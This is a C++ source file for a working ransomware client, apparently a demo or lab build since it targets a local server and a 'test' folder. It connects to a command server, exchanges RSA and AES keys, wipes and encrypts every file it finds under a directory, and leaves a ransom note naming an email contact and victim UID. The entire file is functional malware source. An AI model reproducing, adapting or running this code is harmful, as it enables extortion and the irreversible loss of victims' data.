#include "crypto.hpp"
#include "../include/cryptopp/socketft.h"
#include "file.hpp"
#include <iostream>
#include <string>
#include <time.h>
#include "traverse.hpp"

std::string addr("127.0.0.1");
size_t port=4444;
std::string ransom_directory("test");

int cross_platform_sleep(long seconds)
{
	timespec tt0,tt1;
	tt0.tv_sec=1;
	tt0.tv_nsec=0;
	return nanosleep(&tt0,&tt1);
}

void file_handler(const std::string& filepath,const std::string& key,const std::string& iv)
{
	try
	{
		aes_t aes(key,iv);
		std::string plain;
		if(!file_to_string(filepath,plain))
		{
			std::cout<<"Skipping "<<filepath<<" - Could not read file."<<std::endl;
			return;
		}
		if(!spc_file_wipe(filepath))
		{
			std::cout<<"Skipping "<<filepath<<" - Could not erase."<<std::endl;
			return;
		}
		if(!string_to_file(aes.encrypt(plain),filepath))
		{
			std::cout<<"Skipping "<<filepath<<" - Could not write file."<<std::endl;
			return;
		}
		std::cout<<"Ransomed "<<filepath<<std::endl;
	}
	catch(std::exception& error)
	{
		std::cout<<"Skipping "<<filepath<<" - "<<error.what()<<std::endl;
	}
	catch(...)
	{
		std::cout<<"Skipping "<<filepath<<" - Unknown error."<<std::endl;
	}
}

int main()
{
	CryptoPP::Socket::StartSockets();
	CryptoPP::Socket client;
	client.Create(SOCK_STREAM);
	while(true)
	{
		try
		{
			std::cout<<"Connecting to "<<addr<<":"<<port<<"."<<std::endl;
			try
			{
				client.Connect(addr.c_str(),port);
			}
			catch(...)
			{
				throw std::runtime_error("Connect failed.");
			}
			std::cout<<"Connected."<<std::endl;
			timeval time={0,0};
			if(!client.SendReady(&time))
				throw std::runtime_error("Not ready to send.");
			rsa_t rsa;
			std::string pubkey(rsa.get_public());
			std::cout<<"Generated public key."<<std::endl;
			if(client.Send((unsigned char*)pubkey.c_str(),pubkey.size())!=pubkey.size())
				throw std::runtime_error("Send failed.");
			std::cout<<"Sent public key."<<std::endl;
			unsigned char data;
			std::string uid;
			while(true)
			{
				if(client.Receive(&data,1)!=1)
				{
					try
					{
						uid=rsa.decrypt(uid);
					}
					catch(...)
					{
						throw std::runtime_error("Data decryption failed.");
					}
					if(uid.size()!=40+32+16)
						throw std::runtime_error("Invalid server response.");
					std::string key=uid.substr(40,32);
					std::string iv=uid.substr(40+32,16);
					uid=uid.substr(0,40);
					std::cout<<"UID is: "<<uid<<std::endl;
					traverse_files(ransom_directory,key,iv,file_handler);
					std::cout<<"Ransom complete."<<std::endl;
					string_to_file("You've been ransomwared.\n"
						"Please contact the script kiddie with xxxx@gmail.com and give them the following UID:\n"+
						uid,ransom_directory+"/RANSOMWARED.TXT");
					return 0;
				}
				uid+=data;
			}
		}
		catch(std::exception &error)
		{
			std::cout<<error.what()<<std::endl;
		}
		cross_platform_sleep(1);
	}
	client.CloseSocket();
	CryptoPP::Socket::ShutdownSockets();
	return 0;
}
